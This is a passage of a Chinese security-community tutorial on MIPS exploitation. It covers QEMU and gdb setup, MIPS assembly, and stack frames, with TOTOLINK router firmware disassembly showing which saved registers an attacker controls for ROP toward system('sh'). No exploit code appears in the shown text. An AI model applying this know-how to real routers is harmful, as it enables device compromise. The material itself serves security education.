# mips pwn 快速上手实践指南-先知社区

> **来源**: https://xz.aliyun.com/news/18860  
> **文章ID**: 18860

---

本文大致内容如下：

* mips 环境搭建，用户模式模拟/系统模式模拟，以及调试环境的搭建，编写我们的第一个mips程序
* mips 架构介绍，mips汇编快速上手
* mips 栈帧的工作模式，调用者保存的汇编体现
* mips rop练习：ROPEmporium mips篇从易到难8个练习的详解
* mips srop练习：（The Cyber Jawara International 2024 - mipsssh）比赛真题详解

‍

## qemu 环境搭建

```
# qemu
sudo apt install qemu-system
sudo apt install qemu-system-mips 
sudo apt install qemu-user-static 
sudo apt install qemu-utils 
sudo apt install qemu-web-desktop

# 网桥
#新版ubuntu自带ip命令，可以直接用ip命令完成操作
#sudo apt install bridge-utils uml-utilities

# gdb
sudo apt install gdb gdb-multiarch

# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# gcc
sudo apt install gcc-mips-linux-gnu
sudo apt install gcc-mipsel-linux-gnu
sudo apt install gcc-mips64-linux-gnuabi64
sudo apt install gcc-mips64el-linux-gnuabi64
# python3
sudo apt install python3
sudo apt install python3-pip
```

对于用户模式模拟：类似如下命令即可：`$ qemu-mipsel-static -L /usr/mipsel-linux-gnu/ helloworld`，下面介绍全系统模拟的环境配置

qemu镜像文件和内核：

* 大端序：<https://people.debian.org/\~aurel32/qemu/mips/>
* 小端序：<https://people.debian.org/\~aurel32/qemu/mipsel/>

下载`debian_wheezy_mips_standard.qcow2`镜像文件，和`vmlinux-3.2.0-4-4kc-malta`的内核文件即可

配置网桥，为了方便与qemu网络通信，例如gdb远程调试等，需要配置qemu与宿主机的网络连接

网上常见的创建网桥方式：

```
# 创建网桥
sudo brctl addbr virbr0
sudo ifconfig virbr0 192.168.5.1/24 up

# 创建tap接口，添加到网桥
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.5.11/24 up
sudo brctl addif virbr0 tap0
```

基于ip命令版本：

```
# 1. 创建网桥 virbr0
sudo ip link add name virbr0 type bridge
# 2. 为网桥 virbr0 分配 IP 并启动
sudo ip addr add 192.168.6.1/24 dev virbr0
sudo ip link set dev virbr0 up
# 3. 创建 TAP 接口 tap0
sudo ip tuntap add dev tap0 mode tap
# 4. 启动 TAP 接口 tap0 (不在宿主机上为其分配 IP 地址)
sudo ip link set dev tap0 up
# 5. 将 TAP 接口 tap0 连接到网桥 virbr0
sudo ip link set dev tap0 master virbr0
```

‍

qemu全系统模拟：

```
sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic              
```

命令解释：

```
sudo \
qemu-system-mips \
# QEMU 的可执行文件，用于全系统模拟 MIPS 架构的计算机。
# `qemu-system-*` 表示全系统模拟，`mips` 指明模拟 MIPS 架构。

-M malta \
# -M <machine_type>: 指定模拟的机器/主板型号。
# `malta` 指的是 MIPS Malta 开发评估板，QEMU 支持模拟其硬件。

-kernel vmlinux-3.2.0-4-4kc-malta \
# -kernel <kernel_image_file>: 直接加载并启动指定的 Linux 内核镜像文件，
# 而不使用磁盘镜像中的引导加载程序。
# `vmlinux-3.2.0-4-4kc-malta` 是 MIPS Linux 内核文件名，
# 版本为 3.2.0-4，针对 4kc 核心和 malta 板。

-hda debian_wheezy_mips_standard.qcow2 \
# -hda <disk_image_file>: 指定用作第一个 IDE 硬盘驱动器 (Hard Disk A) 的镜像文件。
# `debian_wheezy_mips_standard.qcow2` 是一个 qcow2 格式的硬盘镜像，
# 内容可能是为 MIPS 架构准备的 Debian Wheezy 系统。

-append "root=/dev/sda1 console=tty0" \
# -append <kernel_command_line_parameters>: 向 Linux 内核命令行追加参数。
# `"root=/dev/sda1"`: 告诉内核根文件系统位于 /dev/sda1 (第一个硬盘的第一个分区)。
# `"console=tty0"`: 尝试指定 tty0 (通常是QEMU图形窗口中的虚拟控制台) 作为内核消息输出控制台。
# 在 -nographic 模式下，输出更可能走向串行端口。

-netdev tap,id=tapnet,ifname=tap0,script=no \
# -netdev <type>,id=<unique_id>[,options...]: 定义一个宿主机端的网络后端。
# `tap`: 指定后端类型为 TAP 网络接口。
# `id=tapnet`: 为此网络后端分配一个唯一的ID "tapnet"，供后续 -device 参数引用。
# `ifname=tap0`: 指定使用宿主机上已存在的、名为 `tap0` 的 TAP 接口。
# `script=no`: 告诉 QEMU 不要运行默认的网络配置脚本 (如 /etc/qemu-ifup)，
# 因为我们假设 tap0 接口已由用户手动配置。

-device rtl8139,netdev=tapnet \
# -device <driver_name>[,properties...]: 为虚拟机创建并配置一个虚拟设备。
# `rtl8139`: 指定为虚拟机创建一个 rtl8139 型号的虚拟网络接口卡 (NIC)。
# `netdev=tapnet`: 将这个虚拟 NIC 连接到之前用 id "tapnet" 定义的网络后端。
# 这意味着虚拟机的网络流量将通过宿主机的 `tap0` 接口。

-nographic
# 禁用 QEMU 的图形输出界面 (如 SDL 窗口)。
# 虚拟机的控制台输出 (通常是串行控制台) 将重定向到启动 QEMU 的宿主机终端。
```

到这里就能启动起来了，默认用户名密码是`root:root`​

## 第一个 MIPS 程序

### 交叉编译

示例代码：

```
#include <stdio.h>

int main() {
    printf("Hello, MIPSel!
");
    return 0;
}
```

交叉编译：

```
mipsel-linux-gnu-gcc helloworld.c -o helloworld
```

默认编译出来是动态链接的程序，可通过qemu指定库来执行，之前安装的环境中位于`/usr/mipsel-linux-gnu/`：

```
$ qemu-mipsel-static -L /usr/mipsel-linux-gnu/ helloworld
Hello, MIPSel!
```

> 对于静态编译的程序，可以不指定`-L`直接运行
>
> 对于其他架构，也是类似的

### qemu 用户模式调试

以gdb模式使用qemu启动程序

```
# '-g 6655' 以 gdb 的方式启动 QEMU，并监听 1234端口
$ qemu-mipsel-static -g 6655 -L /usr/mipsel-linux-gnu/ helloworld
```

另一个终端启动gdb去连接：

```
pwndbg> set architecture mips
pwndbg> set endian little
pwndbg> target remote 127.0.0.1:6655
```

使用pwntools连接：

```
process(["qemu-mipsel","-g","1234","-L","/usr/mipsel-linux-gnu","./hellworld"])
```

这样就能通过脚本输入数据，然后gdb远程附加调试了

### qemu 系统模式调试

下载预编译的 gdbserver：<https://github.com/akpotter/embedded-toolkit>

通过scp将对应结构的gdbserver传入qemu：`scp file username@ip:/path`​

gdbserver 启动进程：

```
./gdbserver 0.0.0.0:6655 demo 
```

gdbserver 附加进程：

```
./gdbserver 0.0.0.0:6655 --attach $(pid)
```

远程gdb连接：

```
pwndbg> set architecture mips
pwndbg> set endian little
pwndbg> target remote 192.168.6.15:6655
```

## MIPS 架构简介

**MIPS (Microprocessor without Interlocked Pipeline Stages)** 是一种精简指令集计算机(RISC)架构，具有以下核心特点：

主要特点：

* **精简指令集**: 指令数量相对较少，每条指令功能单一
* **固定指令长度**: 所有指令都是32位(4字节)长度 **【划重点】**
* **流水线设计**: 支持高效的指令流水线执行
* **寄存器丰富**: 拥有32个通用寄存器
* **加载/存储架构**: 只有load/store指令能访问内存 **【划重点】**
* **延迟槽**: 分支和跳转指令后有一个延迟槽

‍

**对于MIPS程序，两种字节序都很常见，字节序决定了多字节数据在内存中的存储顺序：**

**大端序 (Big Endian)**

* 最高有效字节存储在最低地址
* MIPS BE (Big Endian)
* 人类阅读习惯一致

**小端序 (Little Endian)**

* 最低有效字节存储在最低地址
* MIPS EL (Little Endian)
* Intel x86架构采用

**示例：**

假设32位整数 `0x12345678` 存储在地址 0x1000:

|  |  |  |
| --- | --- | --- |
| **地址** | **大端序(MIPS BE)** | **小端序(MIPSEL)** |
| 0x1000 | 0x12 | 0x78 |
| 0x1001 | 0x34 | 0x56 |
| 0x1002 | 0x56 | 0x34 |
| 0x1003 | 0x78 | 0x12 |

## MIPS 汇编速成

> 我本以为re类的问题需要死扣汇编，后来发现，真正在死扣汇编的是pwn类问题

MIPS32 架构包含一组寄存器，用于在CPU内部快速存储和访问数据。理解这些寄存器的用途对于编写和理解MIPS汇编代码至关重要。

### 通用寄存器 (General Purpose Registers - GPRs)

MIPS32 拥有32个32位的通用寄存器，编号从0到31。它们可以通过编号（如 `$0`, `$1`, ..., `$31`）或约定的汇编助记名（如 `$zero`, `$at`, `$v0`, 等）来访问。虽然大多数GPR可以用于通用目的，但有一些寄存器按照约定有特殊的用途，以支持操作系统、编译器和标准的程序调用约定。

|  |  |  |  |
| --- | --- | --- | --- |
| 寄存器编号 | 汇编助记名 | 约定用途 | 是否由被调用者保存 (Callee-Saved)? |
| ​`$0`​ | ​`$zero`​ | 硬编码为常量 0 | 不适用 |
| ​`$1`​ | ​`$at`​ | 汇编器临时寄存器 (Assembler Temporary)，不应直接在代码中使用 | 否 |
| ​`$2` - `$3`​ | ​`$v0` - `$v1`​ | 函数返回值 (Values for function results) 和表达式求值 | 否 |
| ​`$4` - `$7`​ | ​`$a0` - `$a3`​ | 函数参数 (Arguments) | 否 |
| ​`$8` - `$15`​ | ​`$t0` - `$t7`​ | 临时寄存器 (Temporaries)，调用函数时其值可能被覆盖 | 否 |
| ​`$16` - `$23`​ | ​`$s0` - `$s7`​ | 保存寄存器 (Saved temporaries)，函数调用后其值必须保持不变 | 是 |
| ​`$24` - `$25`​ | ​`$t8` - `$t9`​ | 临时寄存器 (更多 Temporaries) | 否 |
| ​`$26` - `$27`​ | ​`$k0` - `$k1`​ | 保留给操作系统内核 (Reserved for OS kernel) | 不适用 |
| ​`$28`​ | ​`$gp`​ | 全局指针 (Global Pointer) | 是 (通常) |
| ​`$29`​ | ​`$sp`​ | 栈指针 (Stack Pointer) | 是 |
| ​`$30`​ | ​`$fp`​ | 帧指针 (Frame Pointer) (在某些约定中使用) | 是 |
| ​`$31`​ | ​`$ra`​ | 返回地址 (Return Address)，由 `jal` 和 `jalr` 指令设置 | 否 |

‍

### 数据传输指令

**数据传输指令负责在寄存器和内存之间移动数据，是MIPS汇编的基础操作**

#### **lw (Load Word) - 加载字**

**语法**: `lw $rt, offset($rs)`​

**功能**: 从内存加载32位数据到寄存器

```
# 基本用法
lw $t0, 0($sp)        # 从栈顶加载数据到$t0
lw $t1, 4($sp)        # 从$sp+4地址加载数据到$t1
lw $s0, -8($fp)       # 从$fp-8地址加载局部变量

# 访问数组
la $t0, array         # 加载数组地址
lw $t1, 0($t0)        # array[0]
lw $t2, 4($t0)        # array[1] 
lw $t3, 8($t0)        # array[2]
```

#### **sw (Store Word) - 存储字**

**语法**: `sw $rt, offset($rs)`​

**功能**: 将寄存器中32位数据存储到内存

```
# 基本用法
sw $t0, 0($sp)        # 将$t0存储到栈顶
sw $t1, 4($sp)        # 将$t1存储到$sp+4
sw $s0, -8($fp)       # 保存局部变量

# 数组赋值
la $t0, array         # 加载数组地址
li $t1, 42           # 准备要存储的值
sw $t1, 0($t0)       # array[0] = 42
sw $t1, 4($t0)       # array[1] = 42
```

#### **lb/lh (Load Byte/Halfword)**

**lb语法**: `lb $rt, offset($rs)` (加载字节，带符号扩展)

**lh语法**: `lh $rt, offset($rs)` (加载半字，带符号扩展)

```
# 字节操作
lb $t0, 0($s0)        # 加载1字节，符号扩展到32位
lbu $t1, 1($s0)       # 加载1字节，无符号扩展(补0)

# 半字操作  
lh $t2, 0($s1)        # 加载2字节，符号扩展到32位
lhu $t3, 2($s1)       # 加载2字节，无符号扩展(补0)

# 字符串处理示例
la $t0, string        # 字符串地址
lb $t1, 0($t0)        # 读取第一个字符
beq $t1, $zero, end   # 如果是'\0'则结束
```

#### **sb/sh (Store Byte/Halfword)**

**sb语法**: `sb $rt, offset($rs)` (存储字节)

**sh语法**: `sh $rt, offset($rs)` (存储半字)

```
# 字节存储
li $t0, 65           # ASCII 'A'
sb $t0, 0($s0)       # 存储单个字符

# 半字存储
li $t1, 0x1234
sh $t1, 0($s1)       # 存储16位数据

# 字符串操作示例
la $t0, buffer       # 缓冲区地址
li $t1, 72          # 'H'
sb $t1, 0($t0)
li $t1, 105         # 'i' 
sb $t1, 1($t0)
sb $zero, 2($t0)    # 字符串结束符
```

### 算术运算指令

**算术运算指令执行基本的数学计算，包括立即数和寄存器间的运算**

#### **add/addi - 加法**

**add语法**: `add $rd, $rs, $rt` (寄存器间加法)

**addi语法**: `addi $rt, $rs, imm` (立即数加法)

```
# 寄存器间加法
add $t0, $t1, $t2     # $t0 = $t1 + $t2
add $s0, $s1, $s2     # $s0 = $s1 + $s2

# 立即数加法
addi $t0, $t1, 10     # $t0 = $t1 + 10
addi $sp, $sp, -4     # 栈指针向下移动4字节
addi $t2, $zero, 100  # $t2 = 0 + 100 = 100

# 地址计算
la $t0, array         # 数组基地址
addi $t1, $t0, 8      # 第3个元素地址(8 = 2*4)
lw $t2, 0($t1)        # 加载array[2]
```

#### **sub - 减法**

**语法**: `sub $rd, $rs, $rt`​

**功能**: rd  rs - rt

```
# 基本减法
sub $t0, $t1, $t2     # $t0 = $t1 - $t2
sub $s0, $s1, $s2     # $s0 = $s1 - $s2

# 计算数组长度
la $t0, array_end
la $t1, array_start
sub $t2, $t0, $t1     # 字节长度
srl $t3, $t2, 2       # 除以4得到元素个数

# 循环计数器递减
sub $t0, $t0, 1       # i = i - 1
bne $t0, $zero, loop  # if (i != 0) goto loop
```

#### **mul - 乘法**

**语法**: `mul $rd, $rs, $rt` (简单乘法，32位结果)

**扩展**: `mult $rs, $rt` (完整乘法，64位结果存入HI/LO)

```
# 简单乘法
mul $t0, $t1, $t2     # $t0 = $t1 * $t2 (低32位)

# 完整乘法 (处理64位结果)
mult $t1, $t2         # $t1 * $t2 → HI:LO
mflo $t0             # 取低32位到$t0
mfhi $t3             # 取高32位到$t3

# 数组索引计算
li $t0, 5            # 数组索引
li $t1, 4            # sizeof(int)
mul $t2, $t0, $t1    # 偏移量 = index * size
la $t3, array        # 数组基地址
add $t4, $t3, $t2    # 元素地址
lw $t5, 0($t4)       # 加载array[5]
```

#### **div - 除法**

**语法**: `div $rs, $rt`​

**功能**: rs ÷ rt → 商存入LO，余数存入HI

```
# 整数除法
li $t0, 100
li $t1, 7
div $t0, $t1         # 100 ÷ 7
mflo $t2             # 商: 14
mfhi $t3             # 余数: 2

# 除零检查
beq $t1, $zero, div_error  # 检查除数是否为0
div $t0, $t1
mflo $t2

# 实用示例：将秒转换为分钟和秒
li $t0, 125          # 125秒
li $t1, 60           # 60秒/分钟
div $t0, $t1         
mflo $t2             # 分钟数: 2
mfhi $t3             # 剩余秒数: 5
```

### 逻辑运算指令

**逻辑运算指令执行位级操作，包括与、或、异或等运算，常用于位掩码和标志位处理**

#### **and/andi - 与运算**

**and语法**: `and $rd, $rs, $rt` (寄存器间与运算)

**andi语法**: `andi $rt, $rs, imm` (与立即数运算)

```
# 寄存器间与运算
and $t0, $t1, $t2     # $t0 = $t1 & $t2

# 位掩码操作
li $t0, 0x12345678
andi $t1, $t0, 0xFF   # 提取低8位: 0x78
andi $t2, $t0, 0xF0   # 提取4-7位并清零其他位: 0x70

# 检查奇偶性
andi $t1, $t0, 1      # 检查最低位
beq $t1, $zero, even  # 如果结果为0则是偶数

# 清除特定位
li $t0, 0xFF          # 11111111
andi $t0, $t0, 0xFE   # 清除最低位: 11111110
```

#### **or/ori - 或运算**

**or语法**: `or $rd, $rs, $rt` (寄存器间或运算)

**ori语法**: `ori $rt, $rs, imm` (与立即数或运算)

```
# 寄存器间或运算
or $t0, $t1, $t2      # $t0 = $t1 | $t2

# 设置特定位
li $t0, 0x12345670
ori $t0, $t0, 0x0F    # 设置低4位: 0x1234567F

# 合并数据
andi $t1, $t0, 0xFF00  # 提取高字节
andi $t2, $t3, 0x00FF  # 提取低字节
or $t4, $t1, $t2       # 合并

# 构造32位常数(当超出16位立即数范围)
lui $t0, 0x1234       # 加载高16位
ori $t0, $t0, 0x5678  # 设置低16位: 0x12345678
```

#### **xor/xori - 异或运算**

**xor语法**: `xor $rd, $rs, $rt` (寄存器间异或)

**xori语法**: `xori $rt, $rs, imm` (与立即数异或)

```
# 基本异或
xor $t0, $t1, $t2     # $t0 = $t1 ^ $t2

# 清零寄存器 (比li $t0, 0更高效)
xor $t0, $t0, $t0     # $t0 = 0

# 数据加密/解密 (简单XOR加密)
li $t1, 0x12345678    # 原始数据
li $t2, 0xABCDEF00    # 密钥
xor $t0, $t1, $t2     # 加密
xor $t3, $t0, $t2     # 解密(得到原始数据)

# 位翻转
li $t0, 0xFF          # 11111111
xori $t1, $t0, 0xFF   # 翻转所有位: 00000000

# 交换两个寄存器的值 (不使用临时变量)
xor $t0, $t0, $t1
xor $t1, $t0, $t1
xor $t0, $t0, $t1
```

#### 位操作常用技巧

```
# 检查第n位是否为1
# 检查第3位
andi $t1, $t0, 0x08   # 2^3 = 8 = 0x08
bne $t1, $zero, bit_set

# 设置第n位为1
# 设置第5位
ori $t0, $t0, 0x20    # 2^5 = 32 = 0x20

# 清除第n位(设为0)
# 清除第4位
andi $t0, $t0, 0xEF   # ~(2^4) = ~16 = 0xEF

# 切换第n位
# 切换第6位
xori $t0, $t0, 0x40   # 2^6 = 64 = 0x40

# 提取位字段 (提取第2-5位)
srl $t1, $t0, 2       # 右移2位
andi $t1, $t1, 0x0F   # 保留低4位 (2^4-1 = 15 = 0x0F)
```

### 分支跳转指令

**分支跳转指令控制程序的执行流程，实现条件判断、循环和函数调用**

#### **beq - 相等则跳转**

**语法**: `beq $rs, $rt, label`​

**功能**: 如果 rs  rt 则跳转到label

```
# 基本条件判断
li $t0, 10
li $t1, 10
beq $t0, $t1, equal    # 相等，会跳转
# 不相等时执行的代码
j continue

equal:
    # 相等时执行的代码
    li $t2, 1
    
continue:
    # 继续执行

# 循环中的应用
li $t0, 0              # 计数器
loop:
    # 循环体
    addi $t0, $t0, 1
    beq $t0, 10, loop_end  # 计数到10则退出
    j loop
loop_end:

# 字符串比较
la $t0, str1
la $t1, str2
str_compare:
    lb $t2, 0($t0)     # 加载字符
    lb $t3, 0($t1)
    bne $t2, $t3, not_equal  # 字符不同
    beq $t2, $zero, strings_equal  # 都是'\0'
    addi $t0, $t0, 1   # 下一个字符
    addi $t1, $t1, 1
    j str_compare
```

#### **bne - 不等则跳转**

**语法**: `bne $rs, $rt, label`​

**功能**: 如果 rs ! rt 则跳转到label

```
# 输入验证
li $t0, 0              # 用户输入
li $t1, 100            # 最大值
bne $t0, $zero, check_range  # 非零则检查范围
# 输入为0的处理
j input_zero

check_range:
    ble $t0, $t1, valid_input  # 小于等于100
    # 输入过大的处理
    j input_too_large

# 循环遍历数组
la $t0, array          # 数组地址
li $t1, 0              # 索引
array_loop:
    lw $t2, 0($t0)     # 加载元素
    bne $t2, $zero, process  # 非零元素
    # 找到数组结束标记(0)
    j array_end
    
process:
    # 处理非零元素
    addi $t0, $t0, 4   # 下一个元素
    addi $t1, $t1, 1   # 索引+1
    j array_loop
```

#### **j - 无条件跳转**

**语法**: `j label`​

**功能**: 无条件跳转到label

```
# 程序流程控制
main:
    # 初始化
    li $t0, 1
    j start_process    # 跳过错误处理
    
error_handler:
    # 错误处理代码
    li $v0, -1
    j exit
    
start_process:
    # 主要处理逻辑
    beq $t0, $zero, error_handler
    # 正常处理
    
exit:
    # 程序结束

# switch语句实现
li $t0, 2              # case值
beq $t0, 1, case1
beq $t0, 2, case2
beq $t0, 3, case3
j default_case

case1:
    li $t1, 10
    j switch_end
case2:
    li $t1, 20
    j switch_end
case3:
    li $t1, 30
    j switch_end
default_case:
    li $t1, 0
    
switch_end:
    # switch后续处理
```

#### **jal - 跳转并链接**

**语法**: `jal label`​

**功能**: 跳转到label，同时将返回地址保存到ra

```
# 函数调用
main:
    li $a0, 5          # 参数
    li $a1, 3          # 参数
    jal add_function   # 调用函数
    move $t0, $v0      # 获取返回值
    
    li $a0, 10
    jal factorial      # 调用阶乘函数
    
add_function:
    add $v0, $a0, $a1  # 返回值 = 参数1 + 参数2
    jr $ra             # 返回
    
factorial:
    # 保存返回地址(嵌套调用需要)
    addi $sp, $sp, -8
    sw $ra, 4($sp)
    sw $a0, 0($sp)
    
    # 递归基础情况
    beq $a0, 1, fact_base
    ble $a0, $zero, fact_base
    
    # 递归调用
    addi $a0, $a0, -1
    jal factorial
    
    # n * factorial(n-1)
    lw $a0, 0($sp)     # 恢复n
    mul $v0, $v0, $a0
    j fact_return
    
fact_base:
    li $v0, 1          # 0! = 1! = 1
    
fact_return:
    lw $ra, 4($sp)
    addi $sp, $sp, 8
    jr $ra
```

#### **jr - 寄存器跳转**

**语法**: `jr $rs`​

**功能**: 跳转到rs寄存器中存储的地址

```
# 函数返回
some_function:
    # 函数体
    li $v0, 42         # 设置返回值
    jr $ra             # 返回到调用点

# 间接函数调用
.data
func_table: .word func1, func2, func3

.text
# 根据索引调用函数
li $t0, 1              # 选择函数2 (索引1)
sll $t1, $t0, 2        # 索引*4 (字节偏移)
la $t2, func_table
add $t3, $t2, $t1      # 计算函数指针地址
lw $t4, 0($t3)         # 加载函数地址
jalr $t4               # 调用函数

func1:
    li $v0, 1
    jr $ra
    
func2:
    li $v0, 2
    jr $ra
    
func3:
    li $v0, 3
    jr $ra

# 状态机实现
.data
state_table: .word state0, state1, state2

.text
li $s0, 0              # 当前状态
state_machine:
    sll $t0, $s0, 2    # 状态*4
    la $t1, state_table
    add $t2, $t1, $t0
    lw $t3, 0($t2)     # 获取状态处理函数
    jalr $t3           # 调用状态处理函数
    # $v0包含下一个状态
    move $s0, $v0
    bne $s0, -1, state_machine  # -1表示结束
```

### 关于调用者保存（基于真实固件分析）

之前在介绍寄存器的表格中提到关于调用者保存，这在汇编中的体现如下：

**关于被调用者保存 (Callee-Saved) vs. 调用者保存 (Caller-Saved):**

* **调用者保存 (Caller-Saved)** : 如果一个函数（调用者）需要在调用另一个函数后继续使用 `$a0`-`$a3` 或 `$t0`-`$t9` 中的值，那么调用者必须在调用前将这些值保存到栈中，并在调用返回后恢复它们。被调用的函数可以自由使用这些寄存器而无需保存它们之前的值。
* **被调用者保存 (Callee-Saved)** : 如果一个函数（被调用者）需要使用 `$s0`-`$s7`, `$gp`, `$sp`, `$fp` 这些寄存器，它必须在修改它们之前将它们的原始值保存到栈中，并在返回前恢复它们。这样，调用者可以确信这些寄存器的值在函数调用过程中不会改变。

> 示例来自 totolink n600r 固件 cstecgi.cgi

调用者保存，意味着调用者用完还要恢复，这就是rop下可控的寄存器

例如进入函数的时候：

```
LOAD:00404A30                 addiu   $sp, -0x80
LOAD:00404A34                 sw      $ra, 0x58+var_s24($sp)
LOAD:00404A38                 sw      $fp, 0x58+var_s20($sp)
LOAD:00404A3C                 sw      $s7, 0x58+var_s1C($sp)
LOAD:00404A40                 sw      $s6, 0x58+var_s18($sp)
LOAD:00404A44                 sw      $s5, 0x58+var_s14($sp)
LOAD:00404A48                 sw      $s4, 0x58+var_s10($sp)
LOAD:00404A4C                 sw      $s3, 0x58+var_sC($sp)
LOAD:00404A50                 sw      $s2, 0x58+var_s8($sp)
LOAD:00404A54                 sw      $s1, 0x58+var_s4($sp)
LOAD:00404A58                 sw      $s0, 0x58+var_s0($sp)
```

退出函数的时候：

```
LOAD:00404C88 loc_404C88:                              # CODE XREF: sub_404A30+70↑j
LOAD:00404C88                                          # sub_404A30+11C↑j ...
LOAD:00404C88                 lw      $ra, 0x58+var_s24($sp)
LOAD:00404C8C                 lw      $fp, 0x58+var_s20($sp)
LOAD:00404C90                 lw      $s7, 0x58+var_s1C($sp)
LOAD:00404C94                 lw      $s6, 0x58+var_s18($sp)
LOAD:00404C98                 lw      $s5, 0x58+var_s14($sp)
LOAD:00404C9C                 lw      $s4, 0x58+var_s10($sp)
LOAD:00404CA0                 lw      $s3, 0x58+var_sC($sp)
LOAD:00404CA4                 lw      $s2, 0x58+var_s8($sp)
LOAD:00404CA8                 lw      $s1, 0x58+var_s4($sp)
LOAD:00404CAC                 lw      $s0, 0x58+var_s0($sp)
LOAD:00404CB0                 jr      $ra
LOAD:00404CB4                 addiu   $sp, 0x80
```

s0-s7，fp，ra寄存器可控

* s0-s7：潜在的操作a0-a3寄存器的前提
* fp：做栈迁移需要用
* ra：返回地址跳转用

通常使用move伪指令将s0赋值给a0：

```
LOAD:00429EEC                 move    $a0, $s0         # fd
LOAD:00429EF0                 move    $v0, $zero
LOAD:00429EF4
LOAD:00429EF4 loc_429EF4:                              # CODE XREF: getWlStaInfo+4C↑j
LOAD:00429EF4                                          # getWlStaInfo+98↑j ...
LOAD:00429EF4                 lw      $ra, 0x3C+var_s10($sp)
LOAD:00429EF8                 lw      $s3, 0x3C+var_sC($sp)
LOAD:00429EFC                 lw      $s2, 0x3C+var_s8($sp)
LOAD:00429F00                 lw      $s1, 0x3C+var_s4($sp)
LOAD:00429F04                 lw      $s0, 0x3C+var_s0($sp)
LOAD:00429F08                 jr      $ra
```

通过类似的gadget就可以跳转到system("sh")的调用上

## MIPS 栈的工作模式与栈帧

栈是一种后进先出（LIFO）的数据结构，在MIPS中主要用于函数调用、局部变量存储和临时数据保存。

* **栈的增长方向**: 在MIPS中，栈从**高内存地址向低内存地址增长**。
* \*\*栈指针 (\*\*​ **​**`$sp`**​**​ **)** : 寄存器 `$29` (`$sp`) 始终指向栈顶。压栈时 `$sp` 减小，弹栈时 `$sp` 增大。

### 栈帧 (Stack Frame)

每次函数调用时，会在栈上为其创建一个区域，称为该函数的**栈帧**。栈帧包含与该函数调用相关的信息。

【待办：截图】

一个典型的栈帧可能包含（从高地址到低地址）：

1. **传递给当前函数的参数**：如果参数数量超过 `$a0`-`$a3`，或者参数需要在内存中传递。
2. \*\*返回地址 (\*\*​ **​**`$ra`**​**​ **)** ：由 `jal` 指令保存，指向调用者函数中 `jal` 之后的指令。
3. \*\*旧的帧指针 (\*\*​ **​**`$fp`**​**​ **)** ：调用者函数的帧指针，在当前函数返回时需要恢复。
4. \*\*被调用者保存的寄存器 (\*\*​ **​**`$s0`**​**​ \*\*-\*\*​ **​**`$s7`**​**​ **)** ：如果当前函数使用了这些寄存器，它们的值需要在函数开始时保存，在函数结束时恢复。
5. **局部变量**：当前函数内部声明和使用的变量。
6. **临时空间**：用于计算过程中的一些临时数据。

* \*\*帧指针 (\*\*​ **​**`$fp`**​**​ **)** : 寄存器 `$30` (`$fp`) 可选地用作帧指针。如果使用，`$fp` 通常指向栈帧中的一个固定位置（如栈帧底部），为访问局部变量和参数提供一个稳定的基址，即使 `$sp` 在函数执行过程中发生变化。

### 函数调用中的栈操作

* **函数序言 (Prologue)** : 函数开始时执行。

1. 调整 `$sp` 为当前函数栈帧分配空间。
2. 保存 `$ra` 和旧的 `$fp` 到栈上。
3. 设置新的 `$fp`。
4. 保存需要使用的 `$s` 寄存器到栈上。

* **函数尾声 (Epilogue)** : 函数返回前执行。

1. 将返回值放入 `$v0` (和 `$v1`)。
2. 从栈上恢复保存的 `$s` 寄存器。
3. 恢复旧的 `$fp` 和 `$ra`。
4. 调整 `$sp` 释放当前函数栈帧。
5. 使用 `jr $ra` 返回到调用者。

‍

### 示例1：

```
#include<stdio.h>
int main()
{
  puts("Hello, MIPSel!");
  return 0;
}
```

反汇编：

```
.text:00400650  # int __fastcall main(int argc, const char **argv, const char **envp)
.text:00400650                 .globl main
.text:00400650 main:                                    # DATA XREF: LOAD:00400398↑o
.text:00400650                                          # _ftext+1C↑o ...
.text:00400650
.text:00400650 var_8           = -8
.text:00400650 var_s0          =  0
.text:00400650 var_s4          =  4
.text:00400650
.text:00400650                 addiu   $sp, -0x20       # Add Immediate Unsigned
.text:00400654                 sw      $ra, 0x18+var_s4($sp)  # 栈顶抬高，保存ra（返回地址）到栈
.text:00400658                 sw      $fp, 0x18+var_s0($sp)  # 保存fp（帧指针）到栈
.text:0040065C                 move    $fp, $sp         # fp = sp
.text:00400660                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)  # 内存中读取数到gp
.text:00400668                 sw      $gp, 0x18+var_8($sp)  # 读取到的内容保存到栈里

.text:0040066C                 lui     $v0, 0x40  # '@'  # 读取数0x400000到v0
.text:00400670                 addiu   $a0, $v0, (aHelloMipsel - 0x400000)  # 得到字符串地址，在a0
.text:00400674                 la      $v0, puts        # 加载地址puts到v0
.text:00400678                 move    $t9, $v0         # v0的值给t9
.text:0040067C                 jalr    $t9  # puts      # 跳转到t9执行，返回地址保存在ra
.text:00400680                 nop                      # No operation

.text:00400684                 lw      $gp, 0x18+var_8($fp)  # 取回之前保存的内容
.text:00400688                 move    $v0, $zero       # 返回值设置0
.text:0040068C                 move    $sp, $fp         # Move register
.text:00400690                 lw      $ra, 0x18+var_s4($sp)  # 取回ra
.text:00400694                 lw      $fp, 0x18+var_s0($sp)  # 取回fp
.text:00400698                 addiu   $sp, 0x20        # sp还原
.text:0040069C                 jr      $ra              # 返回
.text:004006A0                 nop                      # No operation
.text:004006A0  # End of function main
```

### 示例2：

```
//mipsel-linux-gnu-gcc -L /lib/mipsel-linux-gnu/ callWithParam.c -o callWithParam
#include<stdio.h>
                                                                                                                                                                                                                                                                                        
int av(int l,int r){
        return (l+r) >> 1;
}

int main(){
        int a = 0x100;
        int b = 0x10;                                                                                                                                                                                                                                                                           printf("%x",av(a,b));
        return 0; 
}                                                                                                                                                                                                                                                                }                                                                                                                                                                                                                                                                                       ~                         
```

```
.text:00400688  # int __fastcall main(int argc, const char **argv, const char **envp)
.text:00400688                 .globl main
.text:00400688 main:                                    # DATA XREF: LOAD:00400398↑o
.text:00400688                                          # _ftext+1C↑o ...
.text:00400688
.text:00400688 var_10          = -0x10
.text:00400688 var_8           = -8
.text:00400688 var_4           = -4
.text:00400688 var_s0          =  0
.text:00400688 var_s4          =  4
.text:00400688
.text:00400688                 addiu   $sp, -0x28       # Add Immediate Unsigned
.text:0040068C                 sw      $ra, 0x20+var_s4($sp)  # 栈帧初始化
